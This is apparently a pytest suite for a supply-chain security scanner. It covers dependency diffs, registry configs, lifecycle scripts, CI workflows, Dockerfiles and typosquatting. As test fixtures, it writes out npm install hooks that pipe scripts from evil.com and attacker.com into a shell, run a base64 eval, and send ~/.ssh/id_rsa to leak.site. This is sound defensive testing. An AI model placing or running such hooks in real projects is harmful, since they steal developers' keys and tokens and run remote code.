"""
Unit and Integration Test Suite for Person 2: Suspicious Change Investigator
Phase 1 - Deterministic Detection Engine

Tests both positive and negative cases for:
1. Git diff manifest and lockfile changes (added, removed, modified, floating versions).
2. Manifest and lockfile inconsistencies and security-sensitive file changes.
3. Registry configuration inspection (insecure HTTP, disabled strict-ssl, committed tokens).
4. Dependency sources (direct Git repositories, raw tarball URLs).
5. Static lifecycle script inspection (pipe-to-shell, base64 eval, credential access, env exfiltration)
   versus benign native build compilation (node-gyp rebuild, tsc, webpack).
6. CI/CD workflow security (unpinned actions, script injection, missing permissions, untrusted triggers).
7. Dockerfile inspection (unpinned base images, digest pinning).
8. Typosquatting / name similarity heuristics (edit distance, affix variants) vs canonical packages.
9. Strict evidence classification: OBSERVED_CHANGE vs HEURISTIC_FLAG, and INTRODUCED_IN_RANGE vs PRE_EXISTING.
10. ChangeAnalyzer root CLI orchestration end-to-end.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

# Ensure repo root and src are on sys.path
_ROOT = Path(__file__).resolve().parent.parent
_SRC = _ROOT / "src"
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))
if str(_SRC) not in sys.path:
    sys.path.insert(0, str(_SRC))

import pytest

from change_analyzer import ChangeAnalyzer, CIWorkflowAdapter

SAFE_ENV = {
    "PATH": os.environ.get("PATH", ""),
    "SYSTEMROOT": os.environ.get("SYSTEMROOT", ""),
    "COMSPEC": os.environ.get("COMSPEC", ""),
    "TEMP": os.environ.get("TEMP", ""),
    "TMP": os.environ.get("TMP", ""),
}


def _git(cmd: list[str], cwd: Path, capture_output: bool = False, text: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(
        cmd,
        cwd=cwd,
        check=True,
        capture_output=capture_output,
        text=text,
        env=SAFE_ENV,
        shell=False
    )
from suspicious_changes.manifest_diff_detector import inspect_git_diff_range
from suspicious_changes.registry_detector import (
    inspect_registry_configurations,
    inspect_manifest_dependency_sources,
    inspect_lockfile_sources,
)
from suspicious_changes.lifecycle_script_detector import (
    inspect_lifecycle_scripts_text,
    inspect_lockfile_install_scripts,
)
from suspicious_changes.popular_packages import POPULAR
from suspicious_changes.typosquatting_detector import candidate_matches
from pipeline_analysis.ci import analyze_github_workflow, analyze_generic_ci
from pipeline_analysis.dockerfile import analyze_dockerfile


# ==============================================================================
# 1. Git Diff Manifest and Code Changes
# ==============================================================================

def test_manifest_diff_detector_positive(tmp_path: Path):
    """Positive test: Commit introduces added, removed, modified dependencies and sensitive files."""
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(["git", "init"], cwd=repo, capture_output=True)
    _git(["git", "config", "user.name", "Test User"], cwd=repo)
    _git(["git", "config", "user.email", "test@example.com"], cwd=repo)

    # Initial commit (Base)
    pkg_v1 = {
        "name": "test-pkg",
        "dependencies": {
            "express": "^4.18.2",
            "lodash": "^4.17.21"
        }
    }
    (repo / "package.json").write_text(json.dumps(pkg_v1, indent=2))
    _git(["git", "add", "package.json"], cwd=repo)
    _git(["git", "commit", "-m", "Initial commit"], cwd=repo)
    base_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    # Second commit (Head): add floating dep, remove lodash, update express, touch .env.example
    pkg_v2 = {
        "name": "test-pkg",
        "dependencies": {
            "express": "^4.19.0",
            "evil-lib": "latest"
        }
    }
    (repo / "package.json").write_text(json.dumps(pkg_v2, indent=2))
    (repo / ".env.example").write_text("API_SECRET=sample_secret_key\n")
    _git(["git", "add", "package.json", ".env.example"], cwd=repo)
    _git(["git", "commit", "-m", "Add floating evil-lib and sensitive .env.example"], cwd=repo)
    head_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    findings = inspect_git_diff_range(repo, base_sha, head_sha)
    assert len(findings) >= 3

    categories = {f["category"] for f in findings}
    assert "Dependency Change" in categories
    assert "Repository Diff" in categories

    # Check floating version detection on added dependency
    added_finding = next(f for f in findings if "EVIL-LIB" in f["id"])
    assert added_finding["severity"] == "HIGH"
    assert added_finding["evidence_type"] == "OBSERVED_CHANGE"
    assert added_finding["change_origin"] == "INTRODUCED_IN_RANGE"
    assert added_finding["commit_reference"]["sha"] == head_sha

    # Check removed dependency detection
    removed_finding = next(f for f in findings if "LODASH" in f["id"])
    assert removed_finding["severity"] == "INFO"
    assert removed_finding["evidence_type"] == "OBSERVED_CHANGE"

    # Check sensitive file detection
    env_finding = next(f for f in findings if "_ENV_EXAMPLE" in f["id"])
    assert env_finding["evidence_type"] == "OBSERVED_CHANGE"


def test_manifest_diff_detector_negative(tmp_path: Path):
    """Negative test: Commit modifies unrelated documentation; no manifest changes."""
    repo = tmp_path / "repo"
    repo.mkdir()
    _git(["git", "init"], cwd=repo, capture_output=True)
    _git(["git", "config", "user.name", "Test User"], cwd=repo)
    _git(["git", "config", "user.email", "test@example.com"], cwd=repo)

    (repo / "README.md").write_text("# Project Title")
    _git(["git", "add", "README.md"], cwd=repo)
    _git(["git", "commit", "-m", "Initial docs"], cwd=repo)
    base_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    (repo / "README.md").write_text("# Project Title\nUpdated documentation text.")
    _git(["git", "add", "README.md"], cwd=repo)
    _git(["git", "commit", "-m", "Update docs"], cwd=repo)
    head_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    findings = inspect_git_diff_range(repo, base_sha, head_sha)
    assert len(findings) == 0


# ==============================================================================
# 2. Registry Configurations and Source Inspection
# ==============================================================================

def test_registry_detector_positive(tmp_path: Path):
    """Positive test: Insecure cleartext HTTP registry, disabled strict-ssl, and committed tokens."""
    npmrc = tmp_path / ".npmrc"
    npmrc.write_text(
        "registry=http://insecure-internal-mirror.com/npm/\n"
        "strict-ssl=false\n"
        "//registry.npmjs.org/:_authToken=npm_0123456789abcdef0123456789abcdef\n"
    )

    findings = inspect_registry_configurations(tmp_path)
    assert len(findings) >= 3

    rule_ids = [f["id"] for f in findings]
    assert any("REG-INSECURE-HTTP" in r for r in rule_ids)
    assert any("REG-STRICT-SSL-DISABLED" in r for r in rule_ids)
    assert any("REG-COMMITTED-TOKEN" in r for r in rule_ids)

    # Insecure HTTP should be HIGH, strict-ssl disabled should be CRITICAL, token CRITICAL
    http_f = next(f for f in findings if "REG-INSECURE-HTTP" in f["id"])
    assert http_f["severity"] == "HIGH"
    assert http_f["evidence_type"] == "HEURISTIC_FLAG"

    ssl_f = next(f for f in findings if "REG-STRICT-SSL-DISABLED" in f["id"])
    assert ssl_f["severity"] == "CRITICAL"


def test_registry_detector_negative(tmp_path: Path):
    """Negative test: Standard secure .npmrc using official HTTPS registry."""
    npmrc = tmp_path / ".npmrc"
    npmrc.write_text(
        "registry=https://registry.npmjs.org/\n"
        "strict-ssl=true\n"
    )
    findings = inspect_registry_configurations(tmp_path)
    assert len(findings) == 0


def test_dependency_sources_positive_and_negative():
    """Test direct Git dependencies and raw tarball dependencies versus clean semver."""
    manifest = {
        "dependencies": {
            "clean-dep": "^1.2.3",
            "git-dep": "git+https://github.com/someone/unvetted-repo.git#v1.0",
            "tarball-dep": "http://malicious.org/payloads/package.tgz"
        }
    }
    findings = inspect_manifest_dependency_sources(manifest, "package.json")
    assert len(findings) == 2

    # Clean-dep should NOT be flagged
    assert not any("clean-dep" in f["evidence"] for f in findings)

    # git-dep flagged as direct Git dependency
    git_f = next(f for f in findings if "GIT-DEP" in f["id"])
    assert git_f["severity"] == "MEDIUM"

    # tarball-dep flagged as direct tarball and unencrypted HTTP
    tar_f = next(f for f in findings if "TARBALL-DEP" in f["id"])
    assert tar_f["severity"] == "HIGH"


def test_lockfile_sources_positive():
    """Positive test: Insecure HTTP resolved URL in package-lock.json."""
    lock_data = {
        "packages": {
            "node_modules/insecure-pkg": {
                "version": "1.0.0",
                "resolved": "http://registry.npmjs.org/insecure-pkg/-/insecure-pkg-1.0.0.tgz"
            }
        }
    }
    findings = inspect_lockfile_sources(lock_data, "package-lock.json")
    assert len(findings) == 1
    assert findings[0]["severity"] == "HIGH"
    assert "Unencrypted HTTP" in findings[0]["title"]


# ==============================================================================
# 3. Static Lifecycle Script Inspection
# ==============================================================================

def test_lifecycle_scripts_positive_threats():
    """Positive test: Pipe to shell, base64 eval, credential theft, and env exfiltration."""
    manifest_text = json.dumps({
        "name": "suspicious-scripts",
        "scripts": {
            "preinstall": "curl -s http://evil.com/setup.sh | bash",
            "install": "node -e \"eval(Buffer.from('Y29uc29sZS5sb2coJ2hhY2tlZCcpOw==', 'base64').toString())\"",
            "postinstall": "cat ~/.ssh/id_rsa | curl -d @- https://leak.site/keys",
            "build": "printenv | grep TOKEN > /tmp/token.txt"
        }
    }, indent=2)

    findings = inspect_lifecycle_scripts_text(manifest_text, "package.json")
    assert len(findings) >= 4

    severities = {f["severity"] for f in findings}
    assert "CRITICAL" in severities

    pipe_f = next(f for f in findings if "PIPE_TO_SHELL" in f["id"])
    assert pipe_f["severity"] == "CRITICAL"

    b64_f = next(f for f in findings if "BASE64_EVAL" in f["id"])
    assert b64_f["severity"] == "CRITICAL"

    cred_f = next(f for f in findings if "CREDENTIAL_ACCESS" in f["id"])
    assert cred_f["severity"] == "CRITICAL"


def test_lifecycle_scripts_negative_benign_compilation():
    """Negative test: Benign build commands (node-gyp, tsc, webpack) must NOT be flagged as malicious."""
    manifest_text = json.dumps({
        "name": "benign-native-addon",
        "scripts": {
            "install": "node-gyp rebuild",
            "build": "tsc",
            "bundle": "webpack --mode production",
            "prepare": "patch-package"
        }
    }, indent=2)

    findings = inspect_lifecycle_scripts_text(manifest_text, "package.json")
    assert len(findings) == 0


def test_lockfile_install_scripts_positive_and_negative():
    """Positive and negative test for lockfile install script declaration (hasInstallScript)."""
    lockfile_json = json.dumps({
        "packages": {
            "node_modules/safe-lib": {
                "version": "1.0.0"
            },
            "node_modules/has-hook": {
                "version": "2.1.0",
                "hasInstallScript": True
            }
        }
    })

    # Without commit diff context, static detection defaults to HEURISTIC_FLAG
    findings = inspect_lockfile_install_scripts(lockfile_json, "package-lock.json")
    assert len(findings) == 1
    assert "HAS-HOOK" in findings[0]["id"]
    assert findings[0]["evidence_type"] == "HEURISTIC_FLAG"

    # With commit diff context introduced in range, correctly promotes to OBSERVED_CHANGE
    diff_findings = inspect_lockfile_install_scripts(
        lockfile_json,
        "package-lock.json",
        commit_reference={"sha": "abc1234567890abcdef1234567890abcdef123456"},
        change_origin="INTRODUCED_IN_RANGE"
    )
    assert diff_findings[0]["evidence_type"] == "OBSERVED_CHANGE"


# ==============================================================================
# 4. CI/CD Workflow Security Inspection
# ==============================================================================

def test_github_workflow_positive():
    """Positive test: Unpinned action, missing permissions, and script injection."""
    import textwrap
    workflow_yaml = textwrap.dedent("""
        name: CI
        on: [pull_request]
        jobs:
          build:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v2
              - name: Greet
                run: |
                  echo "Processing PR: ${{ github.event.issue.title }}"
              - name: Remote script
                run: curl -s https://example.com/install.sh | sh
    """).strip()
    findings, _ = analyze_github_workflow(workflow_yaml, ".github/workflows/ci.yml")
    assert len(findings) >= 3

    rule_ids = [f.rule_id for f in findings]
    # GHA004: Missing explicit permissions
    assert "GHA004" in rule_ids
    # GHA001: Action not pinned to commit SHA
    assert "GHA001" in rule_ids
    # GHA003: Script injection via untrusted event expression
    assert "GHA003" in rule_ids
    # GHA007: Remote script piped to shell
    assert "GHA007" in rule_ids


def test_github_workflow_negative():
    """Negative test: Hardened workflow pinned to full 40-char SHA with explicit least privilege."""
    workflow_yaml = """
name: Secure CI
on:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
      - name: Run Tests
        run: npm test
"""
    findings, _ = analyze_github_workflow(workflow_yaml, ".github/workflows/secure.yml")
    # All security checks passed
    assert len(findings) == 0


def test_generic_ci_adapter():
    """Test generic CI static analysis adapter on GitLab CI definition."""
    gitlab_ci = """
build_job:
  image: alpine:latest
  script:
    - curl http://insecure.site/setup.sh | sh
"""
    findings, _ = analyze_generic_ci(gitlab_ci, ".gitlab-ci.yml")
    assert len(findings) >= 2
    rule_ids = [f.rule_id for f in findings]
    assert "CI001" in rule_ids  # curl | sh
    assert "CI003" in rule_ids  # unpinned image tag


# ==============================================================================
# 5. Dockerfile Security Inspection
# ==============================================================================

def test_dockerfile_positive_unpinned_base():
    """Positive test: Dockerfile with unpinned mutable tag."""
    df_content = """
FROM node:12-alpine
WORKDIR /app
COPY . .
RUN npm install
CMD ["node", "server.js"]
"""
    findings, images = analyze_dockerfile(df_content, "Dockerfile")
    assert len(findings) >= 1
    assert any(f.rule_id in ("DF001", "DF002", "DF012") for f in findings)


def test_dockerfile_negative_pinned_digest():
    """Negative test: Dockerfile with immutable sha256 digest pinned base image."""
    df_content = """
FROM node:20-alpine@sha256:7398188188188188188188188188188188188188188188188188188188188188
USER node
WORKDIR /app
"""
    findings, images = analyze_dockerfile(df_content, "Dockerfile")
    # No unpinned tag findings
    assert not any(f.rule_id == "DF001" for f in findings)


# ==============================================================================
# 6. Typosquatting Heuristics
# ==============================================================================

def test_typosquatting_candidate_matching():
    """Test 1-edit distance and affix variant detection vs legitimate packages."""
    npm_refs = POPULAR.get("npm", [])

    # Positive: bcrypt-nodejs variants popular bcrypt with affix
    matches_bcrypt = candidate_matches("npm", "bcrypt-nodejs", npm_refs)
    assert len(matches_bcrypt) > 0
    assert any(m["ref"] == "bcrypt" for m in matches_bcrypt)

    # Positive: expres has edit distance 1 from express
    matches_expres = candidate_matches("npm", "expres", npm_refs)
    assert any(m["ref"] == "express" and m["distance"] == 1 for m in matches_expres)

    # Negative: Canonical popular package should not match itself
    matches_express = candidate_matches("npm", "express", npm_refs)
    assert not any(m["ref"] == "express" for m in matches_express)


# ==============================================================================
# 7. End-to-End ChangeAnalyzer Orchestration
# ==============================================================================

def test_change_analyzer_end_to_end(tmp_path: Path):
    """Full integration test: ChangeAnalyzer coordinates all 7 detectors and outputs JSON."""
    repo = tmp_path / "target_repo"
    repo.mkdir()
    _git(["git", "init"], cwd=repo, capture_output=True)
    _git(["git", "config", "user.name", "Tester"], cwd=repo)
    _git(["git", "config", "user.email", "tester@example.com"], cwd=repo)

    # Base commit
    (repo / "package.json").write_text(json.dumps({"name": "app", "dependencies": {"express": "^4.18.2"}}, indent=2))
    _git(["git", "add", "package.json"], cwd=repo)
    _git(["git", "commit", "-m", "Initial commit"], cwd=repo)
    base_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    # Head commit introduces:
    # 1. Floating dependency "grunt-env": "latest"
    # 2. Dockerfile with unpinned node:12-alpine
    # 3. .npmrc with strict-ssl=false
    # 4. package.json script with pipe-to-shell
    # 5. .github/workflows/ci.yml with unpinned action
    pkg_head = {
        "name": "app",
        "scripts": {
            "postinstall": "curl -s http://attacker.com/mal.sh | sh"
        },
        "dependencies": {
            "express": "^4.18.2",
            "grunt-env": "latest"
        }
    }
    (repo / "package.json").write_text(json.dumps(pkg_head, indent=2))
    (repo / ".npmrc").write_text("strict-ssl=false\n")
    (repo / "Dockerfile").write_text("FROM node:12-alpine\nCMD ['node']\n")

    wf_dir = repo / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "build.yml").write_text("name: Build\non: [push]\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n")

    _git(["git", "add", "."], cwd=repo)
    _git(["git", "commit", "-m", "Introduce supply chain vectors"], cwd=repo)
    head_sha = _git(["git", "rev-parse", "HEAD"], cwd=repo, capture_output=True, text=True).stdout.strip()

    out_file = repo / "suspicious_changes.json"
    analyzer = ChangeAnalyzer(repo_dir=repo, base_commit=base_sha, head_commit=head_sha)
    report = analyzer.run_investigation()

    # Verify JSON structure
    assert report["analysis_type"] == "Suspicious Supply Chain Change Detection"
    assert "metrics" in report
    metrics = report["metrics"]

    assert metrics["total_findings"] >= 5
    assert "OBSERVED_CHANGE" in metrics["evidence_type_counts"]
    assert "HEURISTIC_FLAG" in metrics["evidence_type_counts"]
    assert "INTRODUCED_IN_RANGE" in metrics["origin_counts"]

    # Verify finding schema completeness
    for f in report["findings"]:
        assert "id" in f
        assert "category" in f
        assert "severity" in f
        assert "confidence" in f
        assert "status" in f
        assert "affected_file" in f
        assert "evidence_type" in f
        assert "change_origin" in f
        assert "explanation" in f
        assert "technical_explanation" in f
        assert "recommended_action" in f
        assert f["evidence_type"] in ("OBSERVED_CHANGE", "HEURISTIC_FLAG")
        assert f["change_origin"] in ("INTRODUCED_IN_RANGE", "PRE_EXISTING")
